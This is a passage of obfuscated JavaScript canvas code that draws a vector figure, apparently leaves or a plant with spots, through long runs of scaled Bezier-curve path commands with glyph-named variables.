			Δ.bezierCurveTo(309.633544921875 * ᐃ, 76.98580932617188 * ᐃ, 291.633544921875 * ᐃ, ᐃ * 88.98580932617188, 280.633544921875 * ᐃ, ᐃ * 99.98580932617188);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆⲆⲆ], Ⲇᐃ[5], ⵠΔᐃΔ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔΔᐃⲆ];
			Δ.lineJoin = ⵠ[ᐃΔΔΔ];
			Δ.moveTo(ᐃ * 275.633544921875, 281.9858093261719 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 303.633544921875, ᐃ * 308.9858093261719, ᐃ * 321.633544921875, ᐃ * 308.9858093261719, 335.633544921875 * ᐃ, 315.9858093261719 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 305.633544921875, ᐃ * 320.9858093261719, 278.633544921875 * ᐃ, 307.9858093261719 * ᐃ, ᐃ * 264.633544921875, ᐃ * 293.9858093261719);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆⵠΔⵠ], Ⲇᐃ[ΔΔᐃⲆ], ᐃ * ⵠΔΔᐃΔ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠᐃΔⲆ];
			Δ.moveTo(124.633544921875 * ᐃ, 291.9858093261719 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 106.633544921875, 316.9858093261719 * ᐃ, 72.633544921875 * ᐃ, 325.9858093261719 * ᐃ, 53.633544921875 * ᐃ, ᐃ * 319.9858093261719);
			Δ.bezierCurveTo(ᐃ * 83.633544921875, 308.9858093261719 * ᐃ, ᐃ * 97.633544921875, ᐃ * 298.9858093261719, 112.633544921875 * ᐃ, ᐃ * 284.9858093261719);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[5], 4 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⲆΔΔ];
			Δ.lineJoin = ⵠ[ΔⲆΔΔ];
			Δ.moveTo(ᐃ * 113.633544921875, ᐃ * 80.98580932617188);
			Δ.bezierCurveTo(91.633544921875 * ᐃ, 54.985809326171875 * ᐃ, 72.633544921875 * ᐃ, ᐃ * 56.985809326171875, 36.633544921875 * ᐃ, ᐃ * 49.985809326171875);
			Δ.bezierCurveTo(87.633544921875 * ᐃ, ᐃ * 72.98580932617188, 95.633544921875 * ᐃ, ᐃ * 82.98580932617188, ᐃ * 106.633544921875, ᐃ * 96.98580932617188);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠᐃᐃⲆ], Ⲇᐃ[ᐃⲆⵠΔ], ᐃ * ⵠᐃᐃⲆ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 202.633544921875, 20.985809326171875 * ᐃ);
			Δ.bezierCurveTo(219.633544921875 * ᐃ, ᐃ * 49.985809326171875, ᐃ * 259.633544921875, 80.98580932617188 * ᐃ, 255.633544921875 * ᐃ, ᐃ * 92.98580932617188);
			Δ.bezierCurveTo(ᐃ * 268.633544921875, 86.98580932617188 * ᐃ, 265.633544921875 * ᐃ, ᐃ * 87.98580932617188, 275.633544921875 * ᐃ, 82.98580932617188 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 283.633544921875, ᐃ * 87.98580932617188, ᐃ * 283.633544921875, ᐃ * 87.98580932617188, ᐃ * 291.633544921875, ᐃ * 92.98580932617188);
			Δ.bezierCurveTo(ᐃ * 269.633544921875, 116.98580932617188 * ᐃ, 270.633544921875 * ᐃ, 124.98580932617188 * ᐃ, ᐃ * 267.633544921875, 130.98580932617188 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 307.633544921875, 168.98580932617188 * ᐃ, ᐃ * 339.633544921875, ᐃ * 132.98580932617188, 352.633544921875 * ᐃ, ᐃ * 93.98580932617188);
			Δ.bezierCurveTo(366.633544921875 * ᐃ, 145.98580932617188 * ᐃ, 345.633544921875 * ᐃ, ᐃ * 207.98580932617188, 286.633544921875 * ᐃ, 208.98580932617188 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 315.633544921875, ᐃ * 223.98580932617188, ᐃ * 327.633544921875, ᐃ * 287.9858093261719, 355.633544921875 * ᐃ, 305.9858093261719 * ᐃ);
			Δ.bezierCurveTo(293.633544921875 * ᐃ, 298.9858093261719 * ᐃ, ᐃ * 293.633544921875, ᐃ * 275.9858093261719, ᐃ * 276.633544921875, ᐃ * 266.9858093261719);
			Δ.bezierCurveTo(ᐃ * 274.633544921875, 282.9858093261719 * ᐃ, ᐃ * 287.633544921875, ᐃ * 288.9858093261719, ᐃ * 295.633544921875, ᐃ * 296.9858093261719);
			Δ.bezierCurveTo(ᐃ * 287.133544921875, 302.4858093261719 * ᐃ, 287.133544921875 * ᐃ, ᐃ * 302.4858093261719, ᐃ * 278.633544921875, ᐃ * 307.9858093261719);
			Δ.bezierCurveTo(261.633544921875 * ᐃ, ᐃ * 297.9858093261719, 258.633544921875 * ᐃ, ᐃ * 293.9858093261719, 255.633544921875 * ᐃ, 290.9858093261719 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 249.633544921875, ᐃ * 301.9858093261719, 225.633544921875 * ᐃ, 320.9858093261719 * ᐃ, ᐃ * 202.633544921875, ᐃ * 354.9858093261719);
			Δ.bezierCurveTo(ᐃ * 195.633544921875, ᐃ * 318.9858093261719, ᐃ * 196.633544921875, ᐃ * 306.9858093261719, ᐃ * 198.633544921875, ᐃ * 300.9858093261719);
			Δ.bezierCurveTo(ᐃ * 209.633544921875, ᐃ * 268.9858093261719, 199.633544921875 * ᐃ, ᐃ * 266.9858093261719, ᐃ * 195.633544921875, ᐃ * 256.9858093261719);
			Δ.bezierCurveTo(ᐃ * 183.633544921875, ᐃ * 274.9858093261719, 182.633544921875 * ᐃ, ᐃ * 281.9858093261719, ᐃ * 192.633544921875, ᐃ * 305.9858093261719);
			Δ.bezierCurveTo(ᐃ * 194.633544921875, 317.9858093261719 * ᐃ, 191.633544921875 * ᐃ, 336.9858093261719 * ᐃ, 186.633544921875 * ᐃ, 351.9858093261719 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 166.633544921875, ᐃ * 318.9858093261719, ᐃ * 141.633544921875, ᐃ * 303.9858093261719, 136.633544921875 * ᐃ, ᐃ * 286.9858093261719);
			Δ.bezierCurveTo(ᐃ * 122.633544921875, ᐃ * 303.9858093261719, 115.633544921875 * ᐃ, ᐃ * 305.9858093261719, 109.633544921875 * ᐃ, 306.9858093261719 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 101.133544921875, ᐃ * 301.9858093261719, ᐃ * 94.633544921875, 297.9858093261719 * ᐃ, 92.633544921875 * ᐃ, 296.9858093261719 * ᐃ);
			Δ.bezierCurveTo(116.633544921875 * ᐃ, 277.9858093261719 * ᐃ, 116.633544921875 * ᐃ, 266.9858093261719 * ᐃ, 119.633544921875 * ᐃ, ᐃ * 257.9858093261719);
			Δ.bezierCurveTo(107.633544921875 * ᐃ, ᐃ * 257.9858093261719, ᐃ * 65.633544921875, ᐃ * 308.9858093261719, 24.633544921875 * ᐃ, ᐃ * 303.9858093261719);
			Δ.bezierCurveTo(51.633544921875 * ᐃ, 275.9858093261719 * ᐃ, ᐃ * 64.633544921875, 220.98580932617188 * ᐃ, ᐃ * 108.633544921875, 205.98580932617188 * ᐃ);
			Δ.bezierCurveTo(14.633544921875 * ᐃ, 198.98580932617188 * ᐃ, 26.633544921875 * ᐃ, ᐃ * 142.98580932617188, 25.633544921875 * ᐃ, ᐃ * 86.98580932617188);
			Δ.bezierCurveTo(41.633544921875 * ᐃ, 155.98580932617188 * ᐃ, ᐃ * 81.633544921875, 148.98580932617188 * ᐃ, 113.633544921875 * ᐃ, 124.98580932617188 * ᐃ);
			Δ.bezierCurveTo(102.633544921875 * ᐃ, 93.98580932617188 * ᐃ, ᐃ * 95.633544921875, 88.98580932617188 * ᐃ, 89.633544921875 * ᐃ, 81.98580932617188 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 97.633544921875, 76.48580932617188 * ᐃ, ᐃ * 97.633544921875, ᐃ * 76.48580932617188, 105.633544921875 * ᐃ, 70.98580932617188 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 120.633544921875, 78.98580932617188 * ᐃ, ᐃ * 121.633544921875, 81.98580932617188 * ᐃ, 124.633544921875 * ᐃ, 86.98580932617188 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 132.633544921875, ᐃ * 71.98580932617188, ᐃ * 160.633544921875, ᐃ * 56.985809326171875, 175.633544921875 * ᐃ, ᐃ * 23.985809326171875);
			Δ.bezierCurveTo(182.633544921875 * ᐃ, 53.985809326171875 * ᐃ, ᐃ * 170.633544921875, 102.98580932617188 * ᐃ, ᐃ * 191.633544921875, 125.98580932617188 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 214.633544921875, 89.98580932617188 * ᐃ, ᐃ * 192.633544921875, 58.985809326171875 * ᐃ, 202.633544921875 * ᐃ, ᐃ * 20.985809326171875);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[2], Ⲇᐃ[ᐃⲆᐃᐃ], ᐃ * 5);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(203.633544921875 * ᐃ, ᐃ * 21.985809326171875);
			Δ.bezierCurveTo(223.633544921875 * ᐃ, ᐃ * 63.985809326171875, ᐃ * 227.633544921875, ᐃ * 72.98580932617188, ᐃ * 235.633544921875, 98.98580932617188 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 241.633544921875, ᐃ * 123.98580932617188, 225.633544921875 * ᐃ, 138.98580932617188 * ᐃ, ᐃ * 196.633544921875, ᐃ * 122.98580932617188);
			Δ.bezierCurveTo(ᐃ * 213.633544921875, 93.98580932617188 * ᐃ, 199.633544921875 * ᐃ, ᐃ * 49.985809326171875, 203.633544921875 * ᐃ, 26.985809326171875 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(175.633544921875 * ᐃ, 25.985809326171875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 176.633544921875, ᐃ * 51.985809326171875, 171.633544921875 * ᐃ, 88.98580932617188 * ᐃ, ᐃ * 186.633544921875, 121.98580932617188 * ᐃ);
			Δ.bezierCurveTo(156.633544921875 * ᐃ, ᐃ * 144.98580932617188, 139.633544921875 * ᐃ, 120.98580932617188 * ᐃ, 147.633544921875 * ᐃ, 97.98580932617188 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 152.633544921875, 77.98580932617188 * ᐃ, 162.633544921875 * ᐃ, ᐃ * 60.985809326171875, ᐃ * 176.633544921875, 25.985809326171875 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⲆᐃᐃ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔⲆᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 26.633544921875, 96.98580932617188 * ᐃ);
			Δ.bezierCurveTo(38.633544921875 * ᐃ, 151.98580932617188 * ᐃ, ᐃ * 61.633544921875, ᐃ * 161.98580932617188, 88.633544921875 * ᐃ, ᐃ * 168.98580932617188);
			Δ.bezierCurveTo(117.633544921875 * ᐃ, 177.98580932617188 * ᐃ, ᐃ * 113.633544921875, ᐃ * 185.98580932617188, ᐃ * 106.633544921875, 204.98580932617188 * ᐃ);
			Δ.bezierCurveTo(32.633544921875 * ᐃ, ᐃ * 204.98580932617188, ᐃ * 25.633544921875, 149.98580932617188 * ᐃ, ᐃ * 25.633544921875, ᐃ * 97.98580932617188);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔΔᐃⲆ];
			Δ.moveTo(ᐃ * 351.633544921875, ᐃ * 99.98580932617188);
			Δ.bezierCurveTo(365.633544921875 * ᐃ, 161.98580932617188 * ᐃ, 333.633544921875 * ᐃ, 203.98580932617188 * ᐃ, 287.633544921875 * ᐃ, ᐃ * 207.98580932617188);
			Δ.bezierCurveTo(255.633544921875 * ᐃ, ᐃ * 208.98580932617188, ᐃ * 266.633544921875, ᐃ * 174.98580932617188, 285.633544921875 * ᐃ, ᐃ * 176.98580932617188);
			Δ.bezierCurveTo(ᐃ * 313.633544921875, 178.98580932617188 * ᐃ, ᐃ * 348.633544921875, ᐃ * 135.98580932617188, ᐃ * 353.633544921875, ᐃ * 99.98580932617188);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔⵠ];
			Δ.lineJoin = ⵠ[ΔⵠⲆⲆ];
			Δ.moveTo(350.633544921875 * ᐃ, ᐃ * 302.9858093261719);
			Δ.bezierCurveTo(310.633544921875 * ᐃ, ᐃ * 280.9858093261719, ᐃ * 314.633544921875, 244.98580932617188 * ᐃ, 292.633544921875 * ᐃ, ᐃ * 230.98580932617188);
			Δ.bezierCurveTo(ᐃ * 272.633544921875, ᐃ * 215.98580932617188, 263.633544921875 * ᐃ, ᐃ * 222.98580932617188, 256.633544921875 * ᐃ, 236.98580932617188 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 251.633544921875, ᐃ * 249.98580932617188, ᐃ * 264.633544921875, 255.98580932617188 * ᐃ, ᐃ * 279.633544921875, ᐃ * 268.9858093261719);
			Δ.bezierCurveTo(306.633544921875 * ᐃ, ᐃ * 295.9858093261719, 325.633544921875 * ᐃ, 299.9858093261719 * ᐃ, ᐃ * 349.633544921875, ᐃ * 302.9858093261719);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 95.633544921875, ᐃ * 224.98580932617188);
			Δ.bezierCurveTo(64.633544921875 * ᐃ, 245.98580932617188 * ᐃ, 62.633544921875 * ᐃ, 280.9858093261719 * ᐃ, ᐃ * 32.633544921875, ᐃ * 303.9858093261719);
			Δ.bezierCurveTo(ᐃ * 59.633544921875, ᐃ * 301.9858093261719, 102.633544921875 * ᐃ, 260.9858093261719 * ᐃ, ᐃ * 116.633544921875, ᐃ * 255.98580932617188);
			Δ.bezierCurveTo(139.633544921875 * ᐃ, 229.98580932617188 * ᐃ, ᐃ * 108.633544921875, 209.98580932617188 * ᐃ, 97.633544921875 * ᐃ, ᐃ * 224.98580932617188);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆⵠⵠ];
			Δ.lineJoin = ⵠ[ⲆⲆΔⵠ];
			Δ.moveTo(ᐃ * 195.633544921875, ᐃ * 253.98580932617188);
			Δ.bezierCurveTo(ᐃ * 209.633544921875, ᐃ * 282.9858093261719, 205.633544921875 * ᐃ, ᐃ * 278.9858093261719, ᐃ * 199.633544921875, ᐃ * 307.9858093261719);
			Δ.bezierCurveTo(198.633544921875 * ᐃ, 332.9858093261719 * ᐃ, 201.633544921875 * ᐃ, 340.9858093261719 * ᐃ, 202.633544921875 * ᐃ, 348.9858093261719 * ᐃ);
			Δ.bezierCurveTo(215.633544921875 * ᐃ, 313.9858093261719 * ᐃ, ᐃ * 226.633544921875, 291.9858093261719 * ᐃ, 235.633544921875 * ᐃ, ᐃ * 270.9858093261719);
			Δ.bezierCurveTo(243.633544921875 * ᐃ, 247.98580932617188 * ᐃ, 219.633544921875 * ᐃ, 235.98580932617188 * ᐃ, 196.633544921875 * ᐃ, 252.98580932617188 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆᐃΔᐃ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔΔᐃⲆ];
			Δ.moveTo(ᐃ * 195.633544921875, ᐃ * 251.98580932617188);
			Δ.bezierCurveTo(ᐃ * 176.633544921875, 275.9858093261719 * ᐃ, ᐃ * 182.633544921875, 285.9858093261719 * ᐃ, ᐃ * 191.633544921875, 308.9858093261719 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 194.633544921875, ᐃ * 318.9858093261719, 190.633544921875 * ᐃ, 334.9858093261719 * ᐃ, ᐃ * 186.633544921875, ᐃ * 348.9858093261719);
			Δ.bezierCurveTo(ᐃ * 175.633544921875, 307.9858093261719 * ᐃ, ᐃ * 157.633544921875, ᐃ * 291.9858093261719, ᐃ * 155.633544921875, 272.9858093261719 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 150.633544921875, 243.98580932617188 * ᐃ, ᐃ * 170.633544921875, ᐃ * 236.98580932617188, 195.633544921875 * ᐃ, 251.98580932617188 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔΔΔΔ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔΔᐃⲆ];
			Δ.moveTo(ᐃ * 316, ᐃ * 186.8020782470703);
			Δ.bezierCurveTo(ᐃ * 315, ᐃ * 173.8020782470703, ᐃ * 298, 177.8020782470703 * ᐃ, ᐃ * 293, 183.8020782470703 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 285, 195.8020782470703 * ᐃ, ᐃ * 314, 197.8020782470703 * ᐃ, 315 * ᐃ, 187.8020782470703 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆᐃⲆΔΔ], Ⲇᐃ[7], ⲆΔⵠᐃ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃⲆⵠⵠ];
			Δ.moveTo(ᐃ * 340, 157.8020782470703 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 327, ᐃ * 153.8020782470703, ᐃ * 321, ᐃ * 168.8020782470703, ᐃ * 330, 174.8020782470703 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 341, ᐃ * 178.8020782470703, ᐃ * 347, ᐃ * 161.8020782470703, ᐃ * 341, ᐃ * 157.8020782470703);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[6], Ⲇᐃ[7], ᐃ * 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔᐃΔⲆ];
			Δ.lineJoin = ⵠ[ᐃΔΔⲆ];
			Δ.moveTo(349 * ᐃ, 136.8020782470703 * ᐃ);
			Δ.bezierCurveTo(343 * ᐃ, 135.8020782470703 * ᐃ, ᐃ * 342, 139.8020782470703 * ᐃ, ᐃ * 341, 147.8020782470703 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 343, ᐃ * 155.8020782470703, ᐃ * 353, ᐃ * 143.8020782470703, ᐃ * 349, ᐃ * 137.8020782470703);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠᐃΔⵠⲆ], Ⲇᐃ[7], ⲆⵠᐃⲆ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
			Δ.moveTo(ᐃ * 278.75, ᐃ * 246.4375);
			Δ.bezierCurveTo(ᐃ * 288.75, 242.4375 * ᐃ, 301.75 * ᐃ, ᐃ * 248.4375, 298.75 * ᐃ, ᐃ * 262.4375);
			Δ.bezierCurveTo(293.75 * ᐃ, ᐃ * 271.4375, ᐃ * 287.75, ᐃ * 271.4375, 278.75 * ᐃ, 262.4375 * ᐃ);
			Δ.bezierCurveTo(271.75 * ᐃ, ᐃ * 255.4375, 274.75 * ᐃ, ᐃ * 250.4375, ᐃ * 277.75, 247.4375 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆⵠⲆΔ], Ⲇᐃ[7], ⲆΔⵠᐃ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃᐃⲆᐃ];
			Δ.lineJoin = ⵠ[ΔⲆΔΔ];
			Δ.moveTo(ᐃ * 310.75, ᐃ * 277.4375);
			Δ.bezierCurveTo(319.75 * ᐃ, ᐃ * 280.4375, ᐃ * 322.75, 283.4375 * ᐃ, ᐃ * 321.75, ᐃ * 289.4375);
			Δ.bezierCurveTo(319.75 * ᐃ, ᐃ * 295.4375, ᐃ * 313.75, 291.4375 * ᐃ, 308.75 * ᐃ, 288.4375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 301.75, 281.4375 * ᐃ, ᐃ * 306.75, ᐃ * 277.4375, ᐃ * 309.75, 277.4375 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆΔᐃⵠⵠᐃⵠ], Ⲇᐃ[ⵠᐃⲆᐃΔⲆⵠ], 4 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃⲆⵠΔ];
			Δ.moveTo(ᐃ * 217.75, 257.4375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 227.75, 269.4375 * ᐃ, 220.75 * ᐃ, 281.4375 * ᐃ, 212.75 * ᐃ, ᐃ * 280.4375);
			Δ.bezierCurveTo(206.75 * ᐃ, 279.4375 * ᐃ, 206.75 * ᐃ, 269.4375 * ᐃ, ᐃ * 204.75, 260.4375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 204.75, ᐃ * 254.4375, ᐃ * 211.75, 253.4375 * ᐃ, ᐃ * 216.75, 256.4375 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆΔᐃΔⵠ], Ⲇᐃ[ᐃᐃⵠⵠⵠ], ⲆⵠΔⵠ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 211.75, ᐃ * 289.4375);
			Δ.bezierCurveTo(ᐃ * 219.75, ᐃ * 292.4375, 213.75 * ᐃ, ᐃ * 306.4375, ᐃ * 206.75, 307.4375 * ᐃ);
			Δ.bezierCurveTo(199.75 * ᐃ, 303.4375 * ᐃ, ᐃ * 209.75, 287.4375 * ᐃ, 210.75 * ᐃ, 289.4375 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[6], Ⲇᐃ[ΔⲆΔᐃᐃ], ᐃ * 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⲆⵠⵠ];
			Δ.moveTo(ᐃ * 171.75, ᐃ * 256.4375);
			Δ.bezierCurveTo(162.75 * ᐃ, ᐃ * 273.4375, ᐃ * 166.75, 278.4375 * ᐃ, ᐃ * 175.75, 280.4375 * ᐃ);
			Δ.bezierCurveTo(183.75 * ᐃ, ᐃ * 278.4375, ᐃ * 185.75, 257.4375 * ᐃ, ᐃ * 182.75, ᐃ * 255.4375);
			Δ.bezierCurveTo(176.75 * ᐃ, 251.4375 * ᐃ, 172.75 * ᐃ, ᐃ * 253.4375, 172.75 * ᐃ, ᐃ * 256.4375);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆᐃⲆΔΔ], Ⲇᐃ[ⵠᐃⲆᐃΔⲆⵠ], ⲆⵠΔⵠ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃⲆⵠΔ];
			Δ.moveTo(175.75 * ᐃ, ᐃ * 289.9375);
			Δ.bezierCurveTo(ᐃ * 183.75, 287.9375 * ᐃ, 186.75 * ᐃ, 301.9375 * ᐃ, ᐃ * 182.75, ᐃ * 305.9375);
			Δ.bezierCurveTo(176.75 * ᐃ, 307.9375 * ᐃ, ᐃ * 171.75, 292.9375 * ᐃ, ᐃ * 174.75, 290.9375 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠᐃᐃΔ], Ⲇᐃ[7], ᐃ * ⲆⵠᐃΔ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔᐃΔⲆ];
			Δ.moveTo(205.75 * ᐃ, 314.4375 * ᐃ);
			Δ.bezierCurveTo(209.75 * ᐃ, 316.4375 * ᐃ, ᐃ * 210.75, 320.4375 * ᐃ, 206.75 * ᐃ, 323.4375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 201.75, 324.4375 * ᐃ, 201.75 * ᐃ, ᐃ * 314.4375, ᐃ * 204.75, 314.4375 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠⲆⵠΔ], Ⲇᐃ[ᐃⵠⵠⵠΔ], ᐃ * 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 186.75, ᐃ * 313.4375);
			Δ.bezierCurveTo(ᐃ * 181.75, 315.4375 * ᐃ, ᐃ * 180.75, 321.4375 * ᐃ, 185.75 * ᐃ, 326.4375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 190.75, 327.4375 * ᐃ, ᐃ * 190.75, ᐃ * 313.4375, 187.75 * ᐃ, 314.4375 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[6], Ⲇᐃ[ᐃⵠⲆᐃΔⵠᐃ], ᐃ * 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⵠΔΔ];
			Δ.moveTo(ᐃ * 103.75, ᐃ * 244.4375);
			Δ.bezierCurveTo(96.75 * ᐃ, 239.4375 * ᐃ, ᐃ * 83.75, ᐃ * 240.4375, 81.75 * ᐃ, ᐃ * 255.4375);
			Δ.bezierCurveTo(ᐃ * 80.75, ᐃ * 264.4375, ᐃ * 89.75, ᐃ * 269.4375, 99.75 * ᐃ, ᐃ * 260.4375);
			Δ.bezierCurveTo(106.75 * ᐃ, 254.4375 * ᐃ, 106.75 * ᐃ, ᐃ * 250.4375, 104.75 * ᐃ, 245.4375 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[6], Ⲇᐃ[ⲆⲆⲆᐃΔ], ⲆⵠᐃⲆ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃᐃⲆᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 86.75, 182.4375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 82.75, 170.4375 * ᐃ, ᐃ * 66.75, ᐃ * 169.4375, ᐃ * 61.75, ᐃ * 181.4375);
			Δ.bezierCurveTo(ᐃ * 58.75, ᐃ * 187.4375, 68.75 * ᐃ, 194.4375 * ᐃ, ᐃ * 75.75, ᐃ * 192.4375);
			Δ.bezierCurveTo(83.75 * ᐃ, 192.4375 * ᐃ, 86.75 * ᐃ, 187.4375 * ᐃ, ᐃ * 86.75, ᐃ * 183.4375);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[6], Ⲇᐃ[7], ᐃ * ⲆⵠᐃⲆ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃⲆⵠΔ];
			Δ.moveTo(ᐃ * 44.75, 152.4375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 55.75, 159.4375 * ᐃ, 54.75 * ᐃ, ᐃ * 170.4375, 46.75 * ᐃ, ᐃ * 171.4375);
			Δ.bezierCurveTo(39.75 * ᐃ, ᐃ * 170.4375, ᐃ * 34.75, ᐃ * 151.4375, 43.75 * ᐃ, ᐃ * 152.4375);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠⵠⲆⵠ], Ⲇᐃ[7], ᐃ * 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(31.75 * ᐃ, ᐃ * 130.4375);
			Δ.bezierCurveTo(ᐃ * 35.75, ᐃ * 132.4375, 35.75 * ᐃ, 131.4375 * ᐃ, 37.75 * ᐃ, ᐃ * 137.4375);
			Δ.bezierCurveTo(36.75 * ᐃ, 144.4375 * ᐃ, 36.75 * ᐃ, 145.4375 * ᐃ, ᐃ * 33.75, ᐃ * 144.4375);
			Δ.bezierCurveTo(ᐃ * 26.75, 137.4375 * ᐃ, ᐃ * 29.75, ᐃ * 131.4375, 31.75 * ᐃ, ᐃ * 130.4375);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⲆⲆⲆ], Ⲇᐃ[7], ᐃ * Ⲇᐃⵠᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠᐃⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 69.75, 274.4375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 62.75, 272.4375 * ᐃ, ᐃ * 59.75, ᐃ * 277.4375, 57.75 * ᐃ, 284.4375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 56.75, 290.4375 * ᐃ, ᐃ * 63.75, ᐃ * 289.4375, 71.75 * ᐃ, ᐃ * 282.4375);
			Δ.bezierCurveTo(75.75 * ᐃ, ᐃ * 277.4375, 72.75 * ᐃ, 275.4375 * ᐃ, 69.75 * ᐃ, ᐃ * 274.4375);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[6], Ⲇᐃ[7], ᐃ * ⲆΔⵠᐃ);
			Δ.beginPath();
